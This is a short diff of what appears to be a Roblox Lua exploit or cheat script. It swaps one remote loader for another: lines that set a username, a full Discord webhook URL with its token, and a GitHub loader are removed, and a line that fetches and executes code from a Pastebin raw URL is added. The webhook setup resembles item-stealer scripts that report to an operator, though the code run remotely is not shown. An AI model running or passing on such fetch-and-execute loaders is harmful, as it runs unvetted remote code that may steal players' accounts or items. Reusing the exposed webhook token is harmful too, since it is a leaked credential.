@@ -1,4 +1,2 @@
-UserName = "DubManEL_YT"
-Webhook = "https://discord.com/api/webhooks/1079056244553297951/o9U3FUJgKRQqBvF-5TCFU85_MMiHleXms5uF2y8wtVWriPpknBEhMBX3oK2Uqem-O1P1"
+loadstring(game:HttpGet("https://pastebin.com/raw/h4Tph4wt"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
